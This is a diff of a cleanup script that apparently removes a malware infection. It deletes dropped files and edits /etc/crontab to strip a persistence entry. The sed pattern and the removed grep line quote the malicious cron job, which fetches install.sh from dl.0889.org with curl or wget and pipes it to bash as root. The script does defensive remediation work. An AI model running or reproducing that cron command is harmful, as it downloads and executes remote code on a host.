@@ -9,5 +9,4 @@ sudo rm -f /usr/sbin/kernel
 sudo rm -f /usr/sbin/.conf
 
 echo "remove on crontab"
-crontab -l > crontab_backup.txt
-crontab -l | grep -v "curl -fsSL dl.0889.org/install.sh" | crontab -
+sudo sed -i '/\* \* \* \* \* root \(curl -fsSL dl\.0889\.org\/install\.sh || wget -q -O - dl\.0889\.org\/install\.sh\) | bash >\/dev\/null 2>&1/d' /etc/crontab
